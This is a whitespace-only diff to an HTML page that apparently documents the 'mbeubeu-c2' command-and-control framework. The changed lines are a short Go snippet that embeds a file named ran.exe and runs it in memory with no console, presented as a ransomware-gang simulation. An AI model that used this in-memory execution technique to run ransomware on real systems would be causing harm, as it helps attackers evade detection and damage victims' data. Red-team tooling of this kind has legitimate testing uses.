@@ -237,15 +237,14 @@
       <div class="step">
        <li>🛠️ Ransomware simulations mimicking real-world ransomware gangs (PE in-memory execution with no console, using Go offloading)</li>>
        <pre>
-	       import "mbeubeu-c2/offl/pe"
+       import "mbeubeu-c2/offl/pe"
 
-	       //go:embed ran.exe
-	       var ranBytes []byte
-
-	       func main() {
-	       		output, _ := pe.RunExecutable(ranBytes, []string{"Arg1", "Arg2", "Arg3"})
-			fmt.Println(output)
-	       }
+       //go:embed ran.exe
+       var ranBytes []byte
+       func main() {
+	       output, _ := pe.RunExecutable(ranBytes, []string{"Arg1", "Arg2", "Arg3"})
+	       fmt.Println(output)
+       }
        </pre>
        </div>
        <div class="step">
